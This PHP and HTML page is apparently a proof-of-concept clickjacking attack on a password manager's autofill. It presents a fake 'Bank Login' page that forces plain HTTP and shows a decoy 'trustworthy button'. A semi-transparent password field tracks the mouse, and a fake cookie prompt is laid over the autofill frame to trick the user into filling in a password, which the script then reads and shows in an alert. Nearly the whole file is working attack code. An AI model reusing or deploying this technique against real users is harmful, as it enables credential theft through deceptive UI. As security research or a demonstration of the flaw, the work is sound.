<?php
$is_https = isset($_SERVER['HTTPS']) &&
    ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1);

// CHANGE
if ($is_https) {
  http_response_code(400);
  die('login page must NOT be over https');
}

session_start();
?>

<!doctype html>
<html>
<head>
  <title>Bank Login</title>
</head>
<body style="cursor: pointer">

<div style="position: absolute; top: 300px; left: 500px; width: 200px; height: 50px; background-color: green; color: white; font-family: sans-serif; padding: 1em; box-shadow: 0 0 3px black;">
Please click me! <br>
I am a trustworthy button!
</div>

<form action="http://bank.local/do_login3.php" method="POST">
  <input type="password" name="password">
</form>

<div style="display: none; height: 100%; width: 100%; position: absolute; left: 0; top: 0; background-color: #ccc;">
<div id="warning" style="width: 250px; height: 50px; background-color: #BBDEFB; border: 2px solid #1976D2; border-radius: 4px; opacity: 1 !important; font-family: sans-serif; padding: 4px;">
Please allow cookies to continue.<br>
<u style="font-weight: bold">Accept cookies</u>
</div>
</div>

<script>
const warning = document.querySelector('#warning');
const pwd = document.querySelector('input[type=password]');
let frame = null;
pwd.addEventListener('change', () => {
  setTimeout(() => {
    alert('Got password: ' + pwd.value);
  }, 100);
});
pwd.style.position = 'absolute';
pwd.style.width = "50px";
pwd.style.height = "20px";
pwd.style.opacity = '0.3';
pwd.style.cursor = "pointer";
let mouseX = 0;
let mouseY = 0;
window.addEventListener('mousemove', e => {
  mouseX = e.pageX;
  mouseY = e.pageY;

  /*
  if (e. <= 50 || e.offsetY <= 10) {
    return;
  }
   */

  if (frame) {
    //frame.parentNode.style.left = (e.offsetX - 50) + 'px';
    //frame.parentNode.style.top = (e.offsetY - 100) + 'px';
  }
  else {
    pwd.style.left = (mouseX - 50) + 'px';
    pwd.style.top = (mouseY - 10) + 'px';
  }
});

let doWarning = false;
function check() {
  const frameList = document.getElementsByName('LPFrame');
  if (frameList.length > 0) {
    console.log('lol', frameList);
    frame = frameList[0];
    frame.style.opacity = '0.3';

    if (!doWarning) {
      doWarning = true;
      //warning.parentNode.removeChild(warning);
      //document.body.appendChild(warning);
      warning.parentNode.style.display = 'block';
      warning.style.zIndex = '2147483646';
      warning.style.position = 'absolute';
      warning.style.left = (mouseX - 295) + 'px';
      warning.style.top = (mouseY + 105) + 'px';
    }
  }
}

setInterval(check, 500);
</script>


</body>
</html>
